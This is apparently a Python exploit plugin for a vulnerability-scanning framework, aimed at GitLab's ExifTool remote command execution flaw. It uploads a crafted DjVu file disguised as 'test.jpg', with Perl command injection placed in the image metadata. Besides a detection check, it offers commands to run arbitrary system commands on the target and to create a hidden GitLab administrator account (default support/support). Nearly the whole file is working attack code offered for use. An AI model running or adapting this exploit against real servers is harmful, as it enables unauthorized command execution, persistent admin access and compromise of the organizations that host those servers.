# -*-* coding:UTF-8
import urllib.parse
from bs4 import BeautifulSoup


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "Gitlab远程命令执行漏洞",
        "description": "此漏洞是通过上传功能来实现RCE的，漏洞出于ExifTool功能处，用于从图像中移除元数据的开源工具，因为此工具在解析上传图像中的元数据时，并没有完全解析某些元数据，导致攻击者上传带有恶意元数据的图片，从而导致远程命令执行。",
    }

    def url(self) -> dict:
        r = self.request(method='get', path='./users/sign_in')
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            r1 = self.request(
                method='POST',
                path="./uploads/user",
                timeout=15,
                data="\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; "
                     "name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: "
                     "image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F"
                     "\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,"
                     "q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08"
                     "\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01"
                     "\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9f"
                     "BG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t"
                     "(Copyright \"\\\n\" . qx{%s} . \\\n\" b \") )"
                     "\n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n" % 'whoami',
                headers={
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                    "X-CSRF-Token": token, "Accept-Encoding": "gzip, deflate"
                }
            )
            if 'Failed to process image' in r1.text:
                return {
                    "LoopholeInfo": {"app": "Gitlab", "name": "Gitlab远程命令执行漏洞"}
                }

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(method='get', path='./users/sign_in')
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            with self.echo_query() as execute:
                self.request(
                    method='POST',
                    url=urllib.parse.urljoin(url, "./uploads/user"),
                    timeout=15,
                    data="\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; "
                         "name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: "
                         "image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F"
                         "\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,"
                         "q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08"
                         "\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01"
                         "\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9f"
                         "BG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t"
                         "(Copyright \"\\\n\" . qx{%s} . \\\n\" b \") )"
                         "\n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n" % cmd,
                    headers={
                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                        "X-CSRF-Token": token
                    }
                )
                if execute.verify():
                    return execute.result()

    @cli.command(description='添加管理员账号')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("username", help="用户的名称", default="support")
    @cli.options("password", help="用户的密码", default="support")
    def add_user(self, url, username, password):
        cmd = f"""gitlab-rails runner "user = User.create(username: '{username}',password:'{password}',email:'{username}@gmail.com',name:'{username}',confirmed_at: '2021-08-11 16:46:53'); user.admin=true; user.save;" """
        r = self.request(method='get', path='./users/sign_in')
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            r1 = self.request(
                method='POST',
                url=urllib.parse.urljoin(url, "./uploads/user"),
                timeout=15,
                data="\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; "
                     "name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: "
                     "image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F"
                     "\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,"
                     "q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08"
                     "\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01"
                     "\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9f"
                     "BG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t"
                     "(Copyright \"\\\n\" . qx{%s} . \\\n\" b \") )"
                     "\n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n" % cmd,
                headers={
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                    "X-CSRF-Token": token
                }
            )
            if 'Failed to process image' in r1.text:
                self.log.success('添加用户成功')
                self.log.success(f'用户名称: {username}')
                self.log.success(f'用户密码: {password}')
            else:
                self.log.failure('添加用户失败')
